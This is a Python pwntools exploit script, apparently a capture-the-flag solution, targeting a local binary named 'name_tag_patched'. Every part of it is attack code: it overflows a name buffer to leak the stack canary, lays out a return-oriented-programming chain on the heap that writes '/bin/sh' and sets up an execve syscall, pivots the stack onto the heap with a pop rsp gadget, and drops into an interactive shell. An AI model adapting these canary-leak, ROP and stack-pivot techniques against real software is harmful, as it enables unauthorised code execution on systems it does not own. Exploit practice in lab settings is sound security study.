from pwn import *

p = process("./name_tag_patched")
context.arch='amd64'
elf = ELF("./name_tag_patched", checksec=False)


welcome_message = p.recvuntil(b"Can you please tell us your first name?")
print(welcome_message.decode())


p.sendline(b"\x41" * 41)

first_name_greeting = p.recvuntil(b"\x41" * 41)

stack_canary = (p.recv(7))
stack_canary = u64(stack_canary.rjust(8, b"\x00"))

print(f"stack canary { hex(stack_canary) }")

heap_input_pre_message = p.recvuntil(b"Bio: ")


pop_rsi_gadget = 0x0000000000401641 #  pop rsi; pop r15; ret;
pop_rdi_gadget = 0x0000000000401643 #  pop rdi; ret; 
bin_sh_address = 0x4040d0 
read_str_address = 0x401400
puts_plt_address = elf.symbols['puts']
zero_rdx_add_rax_23_syscall = 0x4015b0 # xor edx, edx; add rax, 0xe; add rax, 8; syscall; 

metched_string_length_address = 0x4020ab
print_tag_address = 0x402168


put_bin_sh_in_memory_phase = p64(pop_rsi_gadget) + p64(8) + p64(0xdeadbeaf) + p64(pop_rdi_gadget) + p64(bin_sh_address) + p64(read_str_address)
put_0x24_in_rax_phase = p64(pop_rdi_gadget) + p64(metched_string_length_address) + p64(puts_plt_address)
put_bin_sh_in_rdi_register = p64(pop_rdi_gadget) + p64(bin_sh_address)
put_zero_in_rsi_register = p64(pop_rsi_gadget) +p64(0) + p64(0xdeadbeaf)

p.sendline(p64(0xdeadbeaf) * 3 + 
            put_bin_sh_in_memory_phase +
            put_0x24_in_rax_phase + 
            put_bin_sh_in_rdi_register + 
            put_zero_in_rsi_register + 
            p64(zero_rdx_add_rax_23_syscall)
            )
            

p.recvuntil(b"Great!!!! Here's your name tag id: ")


heap_pointer = int(p.recvline(drop=True))

print(f"heap memory pointer : {hex(int(heap_pointer))}")

p.recvuntil(b"creation process? ")

fake_rbp = 0xdeafbeaf
pop_rsp = 0x000000000040163d # pop rsp; pop r13; pop r14; pop r15; ret; 

p.sendline(b"B" * 72 + p64(stack_canary) + p64(fake_rbp) + p64(pop_rsp) + p64(heap_pointer))

bin_sh_input = b'/bin/sh\0'

p.sendline(bin_sh_input)

p.interactive()